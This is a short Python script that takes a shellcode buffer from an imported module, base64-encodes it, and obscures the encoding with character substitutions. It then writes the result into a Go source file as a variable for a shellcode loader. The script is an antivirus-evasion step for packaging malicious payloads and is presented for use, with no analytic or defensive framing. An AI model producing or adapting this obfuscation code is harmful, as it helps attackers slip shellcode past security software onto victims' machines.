import base64
import a
import random
import numpy

b64shellcode = base64.b64encode(a.buf)
b64shellcode = b64shellcode.replace("A","#").replace("H","!").replace("1","@").replace("T",")")

Sell_code ='''
package base64_Sell

var (
	Sell="'''

Sell =open("base64_Sell/Sell_code.go","w")
Sell.writelines(Sell_code+b64shellcode+'''"\n)''')